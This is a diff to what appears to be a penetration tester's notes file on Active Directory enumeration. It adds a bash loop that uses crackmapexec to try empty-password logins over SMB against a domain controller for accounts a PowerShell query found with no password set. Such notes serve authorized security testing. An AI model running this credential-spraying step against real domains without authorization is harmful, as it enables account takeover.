@@ -23,3 +23,10 @@ Common place info dump
 ```PowerShell
 Get-ADUser -Filter * -Properties PasswordLastSet | where-object {($_.PasswordLastSet -eq $null) -and ($_.Enabled -eq 'True')} | ft UserPrincipalName, Created, AccountExpirationDate, CannotChangePassword, Description, LastLogonDate, LockedOut, MemberOf, PasswordNotRequired
 ```
+- Now put users into txt file and use cme to see if you can use any (highly unlikely, but do your due dilligence)
+- ```bash
+for user in $(cat nopass_users.txt)
+do
+	crackmapexec smb $someDC -u $user -p ''
+done
+```
